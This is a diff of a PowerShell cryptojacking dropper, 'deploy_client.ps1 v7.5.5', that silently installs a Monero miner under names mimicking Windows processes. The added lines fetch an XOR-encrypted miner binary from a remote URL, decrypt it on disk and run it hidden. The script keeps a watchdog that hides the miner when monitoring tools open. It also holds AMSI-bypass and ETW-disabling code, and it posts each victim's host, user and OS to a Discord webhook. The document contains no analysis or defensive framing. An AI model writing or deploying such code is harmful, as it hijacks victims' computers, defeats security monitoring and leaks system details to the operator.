@@ -83,7 +83,8 @@ $worker = $env:COMPUTERNAME
 $wallet = "467g1meizFe31GzFMG7xoy3yxThG56p7NNzutKff7YPi1DadAdrkY2xLj9zLWjZNm4hfXoF2uxa6PgJCWQc6QUh64NGpXEL"
 $pool = "pool.hashvault.pro:443"
 $poolBak = "pool.supportxmr.com:443"
-$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
+$xorKey = [byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
+$encBinUrl = "https://raw.githubusercontent.com/maroz123/Football/main/xmrig_enc.bin"
 $taskBase = "Microsoft\Windows\NetworkService"
 $taskName = "$taskBase\ProtocolHostMaintenance"
 $wdTask = "$taskBase\FilterHostRestart"
@@ -121,13 +122,11 @@ function Install-Miner {
         taskkill /F /PID $($_.Id) /T 2>$null
     }
     Start-Sleep -Seconds 2
-    $zipFile = "$tempDir\msupdate.zip"
-    $extractDir = "$tempDir\msupdate_extract"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Write-Host "[+] Downloading xmrig..." -ForegroundColor Yellow
+    Write-Host "[+] Downloading packed miner..." -ForegroundColor Yellow
     $downloaded = $false
+    $encFile = "$tempDir\mscache.dat"
     for ($attempt = 1; $attempt -le 3; $attempt++) {
-
         try {
             $versions = @("10.0", "10.0.19041", "10.0.22000", "10.0.22621")
             $winVer = $versions | Get-Random
@@ -136,40 +135,31 @@ function Install-Miner {
             $ua = "Mozilla/5.0 (Windows NT $winVer; Win64; x64) AppleWebKit/537.$chromeBuild (KHTML, like Gecko) Chrome/$chromeMajor.0.0.0 Safari/537.$chromeBuild"
             $wc = New-Object System.Net.WebClient
             $wc.Headers.Add("User-Agent", $ua)
-            $wc.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
-            $wc.Headers.Add("Accept-Language", "en-US,en;q=0.5")
-            $wc.DownloadFile($xmrigUrl, $zipFile)
-            if ((Test-Path $zipFile) -and (Get-Item $zipFile).Length -gt 1MB) { $downloaded = $true; break }
+            $wc.DownloadFile($encBinUrl, $encFile)
+            if ((Test-Path $encFile) -and (Get-Item $encFile).Length -gt 1MB) { $downloaded = $true; break }
         } catch {}
         if (-not $downloaded) {
             try {
-                $ieVersions = @("11.0", "10.0")
-                $ieVer = $ieVersions | Get-Random
-                $ieUA = "Mozilla/5.0 (Windows NT $winVer; WOW64; Trident/7.0; rv:$ieVer) like Gecko"
-                Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UserAgent $ieUA -UseBasicParsing -ErrorAction Stop
-                if ((Test-Path $zipFile) -and (Get-Item $zipFile).Length -gt 1MB) { $downloaded = $true; break }
+                Invoke-WebRequest -Uri $encBinUrl -OutFile $encFile -UserAgent $ua -UseBasicParsing -ErrorAction Stop
+                if ((Test-Path $encFile) -and (Get-Item $encFile).Length -gt 1MB) { $downloaded = $true; break }
             } catch {}
         }
         if (-not $downloaded) {
             try {
-                $bitsName = [guid]::NewGuid().ToString()
-                Start-BitsTransfer -Source $xmrigUrl -Destination $zipFile -DisplayName $bitsName -ErrorAction Stop
-                if ((Test-Path $zipFile) -and (Get-Item $zipFile).Length -gt 1MB) { $downloaded = $true; break }
+                Start-BitsTransfer -Source $encBinUrl -Destination $encFile -ErrorAction Stop
+                if ((Test-Path $encFile) -and (Get-Item $encFile).Length -gt 1MB) { $downloaded = $true; break }
             } catch {}
         }
         if (!$downloaded -and $attempt -lt 3) { Start-Sleep -Seconds 5 }
     }
     if (-not $downloaded) { throw "Download failed" }
-    if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
-    Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
-    $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
-    if ($srcExe -and (Test-Path $srcExe.FullName)) {
-        Copy-Item -Path $srcExe.FullName -Destination $minerExe -Force
-    } else { throw "xmrig.exe not found" }
-    cmd /c "del /f /q `"$zipFile`"" 2>$null
-    Remove-Item $extractDir -Recurse -Force -ErrorAction SilentlyContinue
-    if (!(Test-Path $minerExe) -or (Get-Item $minerExe).Length -lt 1MB) { throw "Miner copy failed" }
-    Write-Host "[+] Miner installed" -ForegroundColor Green
+    Write-Host "[+] Decrypting packed miner..." -ForegroundColor Yellow
+    $encBytes = [IO.File]::ReadAllBytes($encFile)
+    for ($i = 0; $i -lt $encBytes.Length; $i++) { $encBytes[$i] = $encBytes[$i] -bxor $xorKey[$i % $xorKey.Length] }
+    [IO.File]::WriteAllBytes($minerExe, $encBytes)
+    cmd /c "del /f /q `"$encFile`"" 2>$null
+    if (!(Test-Path $minerExe) -or (Get-Item $minerExe).Length -lt 1MB) { throw "Miner decrypt failed" }
+    Write-Host "[+] Packed miner installed" -ForegroundColor Green
 }
 
 function Write-MinerConfig {
@@ -183,7 +173,7 @@ function Write-MinerConfig {
 
 function Write-StealthWatchdog {
     $watchdogBat = "$installDir\SearchFilterHost.bat"
-    $bat = @'
+    $bat = @"
 @echo off
 setlocal EnableDelayedExpansion
 
@@ -191,12 +181,14 @@ set MONITOR_LIST=taskmgr.exe procexp.exe procexp64.exe ProcessHacker.exe SystemI
 set WAS_HIDDEN=0
 set RESTART_COUNT=0
 set MAX_RESTARTS=20
-set LOG_FILE=%ProgramData%\Microsoft\Windows\NetworkService\logs\watchdog.log
-set MINER_DIR=%ProgramData%\Microsoft\Windows\NetworkService\cache
-set MINER_EXE=%MINER_DIR%\SearchProtocolHost.exe
-set MINER_CFG=%MINER_DIR%\mssearch.dat
+set LOG_FILE=$logDir\watchdog.log
+set MINER_DIR=$installDir
+set MINER_EXE=$minerExe
+set MINER_CFG=$configFile
+set XOR_KEY=4D 79 53 65 63 72 65 74 4B 65 79 31 32 33 34 35
+set ENC_URL=$encBinUrl
 
-if not exist "%ProgramData%\Microsoft\Windows\NetworkService\logs" mkdir "%ProgramData%\Microsoft\Windows\NetworkService\logs"
+if not exist "$logDir" mkdir "$logDir"
 
 :loop
 timeout /t 3 /nobreak >nul
@@ -265,7 +257,7 @@ goto loop
 
 :restore
 echo %date% %time% [RESTORE] Miner exe missing, restoring from backup >> "%LOG_FILE%"
-set BACKUP=%ProgramData%\Microsoft\Windows\NetworkService\backup
+set BACKUP=$backupDir
 if exist "%BACKUP%\SearchProtocolHost.exe" (
     copy /y "%BACKUP%\SearchProtocolHost.exe" "%MINER_EXE%" >nul
     copy /y "%BACKUP%\mssearch.dat" "%MINER_CFG%" >nul
@@ -278,29 +270,29 @@ if exist "%BACKUP%\SearchProtocolHost.exe" (
 goto download_fresh
 
 :download_fresh
-echo %date% %time% [DOWNLOAD] No backup found, downloading fresh >> "%LOG_FILE%"
-bitsadmin /transfer minerDl /download /priority high "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" "%TEMP%\msupdate.zip" >nul 2>&1
-if not exist "%TEMP%\msupdate.zip" (
-    powershell.exe -WindowStyle Hidden -Command "$wc=New-Object System.Net.WebClient;$ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';$wc.Headers.Add('User-Agent',$ua);$wc.DownloadFile('https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip','%TEMP%\msupdate.zip')"
+echo %date% %time% [DOWNLOAD] No backup found, downloading packed miner >> "%LOG_FILE%"
+set ENC_FILE=%TEMP%\~mscache.dat
+bitsadmin /transfer minerDl /download /priority high "%ENC_URL%" "%ENC_FILE%" >nul 2>&1
+if not exist "%ENC_FILE%" (
+    powershell.exe -WindowStyle Hidden -Command "$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$wc.DownloadFile('%ENC_URL%','%ENC_FILE%')"
 )
-if not exist "%TEMP%\msupdate.zip" (
+if not exist "%ENC_FILE%" (
     echo %date% %time% [FAIL] Download failed >> "%LOG_FILE%"
     set RESTART_COUNT=0
     goto loop
 )
-tar -xf "%TEMP%\msupdate.zip" -C "%TEMP%" 2>nul
-for /f "tokens=*" %%D in ('dir /b /ad "%TEMP%\xmrig*" 2^>nul') do copy /y "%TEMP%\%%D\xmrig.exe" "%MINER_EXE%" >nul
-del /f /q "%TEMP%\msupdate.zip" >nul 2>&1
+powershell.exe -WindowStyle Hidden -Command "$k=[byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35);$b=[IO.File]::ReadAllBytes('%ENC_FILE%');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i % $k.Length]};[IO.File]::WriteAllBytes('%MINER_EXE%',$b)"
+del /f /q "%ENC_FILE%" >nul 2>&1
 if exist "%MINER_EXE%" (
     set /a RESTART_COUNT+=1
     start "" /min "%MINER_EXE%" --config="%MINER_CFG%"
-    echo %date% %time% [DOWNLOAD] Fresh install complete >> "%LOG_FILE%"
+    echo %date% %time% [DOWNLOAD] Fresh packed install complete >> "%LOG_FILE%"
     timeout /t 5 /nobreak >nul
 ) else (
-    echo %date% %time% [FAIL] Download extracted but exe missing >> "%LOG_FILE%"
+    echo %date% %time% [FAIL] Decrypt failed >> "%LOG_FILE%"
 )
 goto loop
-'@
+"@
     Set-Content -Path $watchdogBat -Value $bat -Force
     $vbsCode = "Set objShell = CreateObject(`"WScript.Shell`")`nobjShell.Run `"cmd.exe /c `"`"$watchdogBat`"`"`", 0, False"
     Set-Content -Path $watchdogVbs -Value $vbsCode -Force
@@ -308,66 +300,64 @@ goto loop
 }
 
 function Write-SelfHealScript {
-    $healCode = @'
-$ErrorActionPreference = "SilentlyContinue"
+    $healCode = @"
+`$ErrorActionPreference = "SilentlyContinue"
 try {
-    $asm = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
-    $type = $asm.GetType('System.Management.Automation.AmsiUtils')
-    $field = $type.GetField('amsiInitFailed', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
-    $field.SetValue($null, $true)
+    `$asm = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
+    `$type = `$asm.GetType('System.Management.Automation.AmsiUtils')
+    `$field = `$type.GetField('amsiInitFailed', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
+    `$field.SetValue(`$null, `$true)
 } catch {}
 try {
-    $scanBuffer = $asm.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
-    if ($scanBuffer) {
-        $scanPtr = $scanBuffer.MethodHandle.GetFunctionPointer()
-        $oldProtect = [UInt32]0
-        $VP = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);' -Name "Kernel32" -Namespace "Win32" -PassThru
-        $VP::VirtualProtect($scanPtr, [UInt32]32, [UInt32]0x40, [ref]$oldProtect) | Out-Null
-        [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, $scanPtr, 1)
+    `$scanBuffer = `$asm.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
+    if (`$scanBuffer) {
+        `$scanPtr = `$scanBuffer.MethodHandle.GetFunctionPointer()
+        `$oldProtect = [UInt32]0
+        `$VP = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);' -Name "Kernel32" -Namespace "Win32" -PassThru
+        `$VP::VirtualProtect(`$scanPtr, [UInt32]32, [UInt32]0x40, [ref]`$oldProtect) | Out-Null
+        [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, `$scanPtr, 1)
     }
 } catch {}
 try {
-    $etwType = $asm.GetType('System.Management.Automation.PSEtwLogProvider')
-    $etwField = $etwType.GetField('etwProvider', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
-    $etwField.SetValue($null, $null)
+    `$etwType = `$asm.GetType('System.Management.Automation.PSEtwLogProvider')
+    `$etwField = `$etwType.GetField('etwProvider', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
+    `$etwField.SetValue(`$null, `$null)
 } catch {}
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$root = "$env:ProgramData\Microsoft\Windows\NetworkService"
-$minerPath = "$root\cache\SearchProtocolHost.exe"
-$configPath = "$root\cache\mssearch.dat"
-$backupPath = "$root\backup"
-$running = Get-Process -Name "SearchProtocolHost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*NetworkService*" }
-if ($running) { exit 0 }
-if ((Test-Path "$backupPath\SearchProtocolHost.exe") -and (Test-Path "$backupPath\mssearch.dat")) {
-    if (!(Test-Path "$root\cache")) { New-Item -ItemType Directory -Path "$root\cache" -Force | Out-Null }
-    Copy-Item "$backupPath\SearchProtocolHost.exe" $minerPath -Force
-    Copy-Item "$backupPath\mssearch.dat" $configPath -Force
-    Start-Process -FilePath $minerPath -ArgumentList "--config=`"$configPath`"" -WindowStyle Hidden -PassThru | Out-Null
+`$root = "$rootDir"
+`$minerPath = "$minerExe"
+`$configPath = "$configFile"
+`$backupPath = "$backupDir"
+`$xorKey = [byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
+`$encUrl = "$encBinUrl"
+`$running = Get-Process -Name "SearchProtocolHost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -like "*NetworkService*" }
+if (`$running) { exit 0 }
+if ((Test-Path "`$backupPath\SearchProtocolHost.exe") -and (Test-Path "`$backupPath\mssearch.dat")) {
+    if (!(Test-Path "`$root\cache")) { New-Item -ItemType Directory -Path "`$root\cache" -Force | Out-Null }
+    Copy-Item "`$backupPath\SearchProtocolHost.exe" `$minerPath -Force
+    Copy-Item "`$backupPath\mssearch.dat" `$configPath -Force
+    Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`"`$configPath`"`"" -WindowStyle Hidden -PassThru | Out-Null
     exit 0
 }
 try {
-    $zip = "$env:Temp\~$msupdate.zip"
-    $ext = "$env:Temp\~$msupdate_extract"
-    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.$(Get-Random -Minimum 3000 -Maximum 5800) (KHTML, like Gecko) Chrome/$(Get-Random -Minimum 90 -Maximum 121).0.0.0 Safari/537.$(Get-Random -Minimum 3000 -Maximum 5800)"
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", $ua)
-    $wc.DownloadFile("https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip", $zip)
-    if (!(Test-Path $zip) -or (Get-Item $zip).Length -lt 1MB) {
-        Start-BitsTransfer -Source "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -Destination $zip -ErrorAction Stop
+    `$encFile = "`$env:Temp\~mscache.dat"
+    `$wc = New-Object System.Net.WebClient
+    `$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+    `$wc.DownloadFile(`$encUrl, `$encFile)
+    if (!(Test-Path `$encFile) -or (Get-Item `$encFile).Length -lt 1MB) {
+        Start-BitsTransfer -Source `$encUrl -Destination `$encFile -ErrorAction Stop
     }
-    if (Test-Path $ext) { Remove-Item $ext -Recurse -Force }
-    Expand-Archive -Path $zip -DestinationPath $ext -Force
-    $src = Get-ChildItem $ext -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-    if ($src) {
-        if (!(Test-Path "$root\cache")) { New-Item -ItemType Directory -Path "$root\cache" -Force | Out-Null }
-        Copy-Item $src.FullName $minerPath -Force
-        Set-Content -Path $configPath -Value '{"autosave":false,"cpu":{"max-threads-hint":10,"priority":2,"huge-pages":true},"opencl":false,"cuda":false,"pools":[{"url":"stratum+ssl://pool.hashvault.pro:443","user":"467g1meizFe31GzFMG7xoy3yxThG56p7NNzutKff7YPi1DadAdrkY2xLj9zLWjZNm4hfXoF2uxa6PgJCWQc6QUh64NGpXEL","pass":"' + $env:COMPUTERNAME + '","keepalive":true,"tls":true}],"donate-level":0,"background":true,"randomx":{"1gb-pages":true,"wrmsr":true,"numa":true}}' -Force
-        Start-Process -FilePath $minerPath -ArgumentList "--config=`"$configPath`"" -WindowStyle Hidden -PassThru | Out-Null
-        Remove-Item $zip -Force -ErrorAction SilentlyContinue
-        Remove-Item $ext -Recurse -Force -ErrorAction SilentlyContinue
+    if (Test-Path `$encFile) {
+        `$encBytes = [IO.File]::ReadAllBytes(`$encFile)
+        for (`$i = 0; `$i -lt `$encBytes.Length; `$i++) { `$encBytes[`$i] = `$encBytes[`$i] -bxor `$xorKey[`$i % `$xorKey.Length] }
+        if (!(Test-Path "`$root\cache")) { New-Item -ItemType Directory -Path "`$root\cache" -Force | Out-Null }
+        [IO.File]::WriteAllBytes(`$minerPath, `$encBytes)
+        Set-Content -Path `$configPath -Value '{\"autosave\":false,\"cpu\":{\"max-threads-hint\":10,\"priority\":2,\"huge-pages\":true},\"opencl\":false,\"cuda\":false,\"pools\":[{\"url\":\"stratum+ssl://pool.hashvault.pro:443\",\"user\":\"467g1meizFe31GzFMG7xoy3yxThG56p7NNzutKff7YPi1DadAdrkY2xLj9zLWjZNm4hfXoF2uxa6PgJCWQc6QUh64NGpXEL\",\"pass\":\"' + `$env:COMPUTERNAME + '\",\"keepalive\":true,\"tls\":true}],\"donate-level\":0,\"background\":true,\"randomx\":{\"1gb-pages\":true,\"wrmsr\":true,\"numa\":true}}' -Force
+        Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`"`$configPath`"`"" -WindowStyle Hidden -PassThru | Out-Null
+        Remove-Item `$encFile -Force -ErrorAction SilentlyContinue
     }
 } catch {}
-'@
+"@
     Set-Content -Path $selfHealPs1 -Value $healCode -Force
     Write-Host "[+] Self-heal script written" -ForegroundColor Green
 }
@@ -421,11 +411,6 @@ function Enable-HugePages {
 function Disable-Sleep {
     $powerBase = "HKLM:\SYSTEM\CurrentControlSet\Control\Power"
     Set-ItemProperty -Path $powerBase -Name "HibernateEnabled" -Value 0 -Type DWord -ErrorAction SilentlyContinue
-    $acPath = "$powerBase\PowerSettings\238C9FA8-0AAD-41ED-83F4-97BE242C8F20\2bc49689-7377-4c74-8e6c-5d063b2e4e3f"
-    @($acPath) | ForEach-Object {
-        if (!(Test-Path $_)) { New-Item -Path $_ -Force | Out-Null }
-        Set-ItemProperty -Path $_ -Name "Attributes" -Value 2 -Type DWord -ErrorAction SilentlyContinue
-    }
     Write-Host "[+] Sleep disabled" -ForegroundColor Green
 }
 
@@ -467,25 +452,24 @@ function Backup-MinerFiles {
 
 function Send-DiscordWebhook {
     param([bool]$Success = $true, [string]$ErrorMsg = "")
-       $webhookUrl = "https://discord.com/api/webhooks/1550937962173169804/H-WL-mcPYjAnDH2rhxy2uMWl8SIdncytNI1cnXHZNEpij6bR6cCaO3EhDulq31KBJ6QT"
+    $webhookUrl = "https://discord.com/api/webhooks/1550937962173169804/H-WL-mcPYjAnDH2rhxy2uMWl8SIdncytNI1cnXHZNEpij6bR6cCaO3EhDulq31KBJ6QT"
     $osName = "Unknown"
     try { $osName = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch {}
     $statusField = if ($Success) { "Success" } else { "Failed: $ErrorMsg" }
     $color = if ($Success) { 3447003 } else { 16711680 }
-    $encWallet = Protect-String $wallet
-    $payload = @{username="SOINION";embeds=@(@{title="Miner Deployed (v7.5.5 BUGFIX)";color=$color;fields=@(@{name="Host";value="$env:COMPUTERNAME";inline=$true},@{name="User";value="$env:USERNAME";inline=$true},@{name="OS";value=$osName;inline=$false},@{name="Status";value=$statusField;inline=$false},@{name="Stealth";value="Dual AMSI, unified watchdog, crash limits, logging, no wmic, obfuscated C2";inline=$false});footer=@{text="deploy_client.ps1 v7.5.5"};timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")})} | ConvertTo-Json -Depth 5
+    $payload = @{username="SOINION";embeds=@(@{title="Miner Deployed (v7.5.5 PACKED)";color=$color;fields=@(@{name="Host";value="$env:COMPUTERNAME";inline=$true},@{name="User";value="$env:USERNAME";inline=$true},@{name="OS";value=$osName;inline=$false},@{name="Status";value=$statusField;inline=$false},@{name="Stealth";value="Packed binary, XOR encrypted, no stock xmrig on disk";inline=$false});footer=@{text="deploy_client.ps1 v7.5.5 PACKED"};timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")})} | ConvertTo-Json -Depth 5
     try {
         [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add("Content-Type", "application/json")
         $webClient.UploadString($webhookUrl, "POST", $payload) | Out-Null
-        } catch { Write-Host "[!] Webhook failed: $_" -ForegroundColor Red }
+    } catch { Write-Host "[!] Webhook failed: $_" -ForegroundColor Red }
 }
 
 $deploymentSuccess = $false
 $deploymentError = ""
 try {
-    Write-Host "`n[!] deploy_client.ps1 v7.5.5 - BUGFIX EDITION" -ForegroundColor Cyan
+    Write-Host "`n[!] deploy_client.ps1 v7.5.5 - PACKED EDITION" -ForegroundColor Cyan
     Invoke-DefenseEvasion
     Start-RandomDelay -Min 3 -Max 8
     Disable-Sleep
@@ -518,7 +502,7 @@ try {
         $deploymentSuccess = $true
         Write-Host "`n[+] DEPLOYMENT SUCCESS" -ForegroundColor Green
         Write-Host "[+] Miner PID: $($minerProc.Id)" -ForegroundColor Green
-        Write-Host '[+] All 10 bugs fixed' -ForegroundColor Green
+        Write-Host '[+] Packed binary deployed - no stock xmrig on disk' -ForegroundColor Green
     } else {
         $deploymentError = "Miner not running after start"
         Write-Host "`n[-] DEPLOYMENT FAILED: $deploymentError" -ForegroundColor Red
@@ -527,7 +511,6 @@ try {
     $deploymentSuccess = $false
     $deploymentError = $_.Exception.Message
     Write-Host "`n[-] DEPLOYMENT FAILED: $deploymentError" -ForegroundColor Red
-    & cmd /c "del /f /q `"$tempDir\msupdate.zip`"" 2>$null
 }
 
 Send-DiscordWebhook -Success $deploymentSuccess -ErrorMsg $deploymentError
@@ -556,4 +539,4 @@ if ($deploymentSuccess) {
     }
 }
 
-Write-Host "`n[!] Done. v7.5.5 deployed." -ForegroundColor Cyan
+Write-Host "`n[!] Done. v7.5.5 PACKED deployed." -ForegroundColor Cyan
